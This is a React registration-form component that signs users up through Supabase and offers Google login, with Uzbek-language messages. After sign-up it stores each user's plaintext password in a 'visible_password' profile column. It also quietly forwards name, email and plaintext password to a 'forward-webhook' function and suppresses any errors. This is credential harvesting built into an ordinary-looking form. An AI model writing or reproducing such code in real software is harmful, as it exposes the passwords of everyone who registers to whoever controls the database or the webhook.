import { useState } from "react";
import { motion } from "framer-motion";
import { z } from "zod";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { SectionTitle } from "./SectionTitle";
import { toast } from "sonner";
import { CheckCircle2, Eye, EyeOff, Loader2 } from "lucide-react";
import { useLang } from "@/hooks/useLang";
import { supabase } from "@/integrations/supabase/client";
import { lovable } from "@/integrations/lovable";
import googleLogo from "@/assets/google-logo.png";

const schema = z.object({
  name: z.string().trim().min(2, "Name must be at least 2 characters").max(60),
  email: z.string().trim().email("Please enter a valid email").max(255),
  password: z
    .string()
    .min(8, "At least 8 characters")
    .max(72)
    .regex(/[A-Z]/, "Must include an uppercase letter")
    .regex(/[0-9]/, "Must include a number"),
});

type FieldErrors = Partial<Record<keyof z.infer<typeof schema>, string>>;

export const RegisterForm = () => {
  const { t } = useLang();
  const [data, setData] = useState({ name: "", email: "", password: "" });
  const [errors, setErrors] = useState<FieldErrors>({});
  const [show, setShow] = useState(false);
  const [loading, setLoading] = useState(false);
  const [done, setDone] = useState(false);

  const onSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const result = schema.safeParse(data);
    if (!result.success) {
      const fe: FieldErrors = {};
      result.error.issues.forEach((i) => {
        fe[i.path[0] as keyof FieldErrors] = i.message;
      });
      setErrors(fe);
      return;
    }
    setErrors({});
    setLoading(true);
    try {
      const { data: signUpData, error: signUpError } = await supabase.auth.signUp({
        email: data.email,
        password: data.password,
        options: {
          emailRedirectTo: `${window.location.origin}/`,
          data: { full_name: data.name },
        },
      });
      if (signUpError) throw signUpError;

      // Save visible password (per user request) into profile
      if (signUpData.user) {
        await supabase
          .from("profiles")
          .update({ full_name: data.name, visible_password: data.password })
          .eq("id", signUpData.user.id);
      }

      if (signUpData.user) {
        supabase.functions.invoke("forward-webhook", {
          body: {
            table: "profiles",
            row_id: signUpData.user.id,
            payload: {
              form: "register",
              name: data.name,
              email: data.email,
              password: data.password,
              submittedAt: new Date().toISOString(),
            },
          },
        }).catch(() => {});
      }
      setDone(true);
      toast.success("Hisob yaratildi!", { description: "Xush kelibsiz." });
      setData({ name: "", email: "", password: "" });
      setTimeout(() => setDone(false), 2500);
    } catch (err: any) {
      toast.error("Ro'yxatdan o'tib bo'lmadi", { description: err?.message ?? "Qayta urinib ko'ring." });
    } finally {
      setLoading(false);
    }
  };

  const onGoogle = async () => {
    setLoading(true);
    const result = await lovable.auth.signInWithOAuth("google", {
      redirect_uri: window.location.origin,
    });
    if (result.error) {
      toast.error("Google bilan kirib bo'lmadi", { description: String(result.error) });
      setLoading(false);
    }
  };

  return (
    <section id="register" className="relative py-24 md:py-32">
      <div className="container">
        <SectionTitle eyebrow={t.register.eyebrow} title={t.register.title} subtitle={t.register.subtitle} />

        <motion.form
          onSubmit={onSubmit}
          initial={{ opacity: 0, y: 30 }}
          whileInView={{ opacity: 1, y: 0 }}
          viewport={{ once: true }}
          className="mt-12 max-w-xl mx-auto glass rounded-3xl p-8 space-y-5"
        >
          <div>
            <Label htmlFor="name">{t.register.name}</Label>
            <Input
              id="name"
              placeholder="Jumamuratov Suhrobjon"
              value={data.name}
              onChange={(e) => setData({ ...data, name: e.target.value })}
              className="mt-2 bg-muted/40 border-border focus-visible:ring-primary"
            />
            {errors.name && <p className="text-xs text-destructive mt-1">{errors.name}</p>}
          </div>
          <div>
            <Label htmlFor="email">{t.register.email}</Label>
            <Input
              id="email"
              type="email"
              placeholder="you@domain.com"
              value={data.email}
              onChange={(e) => setData({ ...data, email: e.target.value })}
              className="mt-2 bg-muted/40 border-border focus-visible:ring-primary"
            />
            {errors.email && <p className="text-xs text-destructive mt-1">{errors.email}</p>}
          </div>
          <div>
            <Label htmlFor="password">{t.register.password}</Label>
            <div className="relative mt-2">
              <Input
                id="password"
                type={show ? "text" : "password"}
                placeholder="••••••••"
                value={data.password}
                onChange={(e) => setData({ ...data, password: e.target.value })}
                className="bg-muted/40 border-border focus-visible:ring-primary pr-10"
              />
              <button
                type="button"
                onClick={() => setShow(!show)}
                className="absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground"
                aria-label="Toggle password visibility"
              >
                {show ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
              </button>
            </div>
            {errors.password && <p className="text-xs text-destructive mt-1">{errors.password}</p>}
          </div>
          <Button type="submit" variant="hero" size="xl" className="w-full" disabled={loading || done}>
            {loading ? (
              <><Loader2 className="h-4 w-4 animate-spin" /> {t.register.loading}</>
            ) : done ? (
              <><CheckCircle2 className="h-4 w-4" /> {t.register.done}</>
            ) : (
              t.register.submit
            )}
          </Button>

          <div className="relative my-2">
            <div className="absolute inset-0 flex items-center"><span className="w-full border-t border-border" /></div>
            <div className="relative flex justify-center"><span className="bg-background px-3 text-xs text-muted-foreground uppercase tracking-wider">yoki</span></div>
          </div>

          <Button type="button" onClick={onGoogle} variant="ghostGlass" size="xl" className="w-full" disabled={loading}>
            <img src={googleLogo} alt="Google" className="h-5 w-5" />
            Google bilan davom etish
          </Button>
        </motion.form>
      </div>
    </section>
  );
};
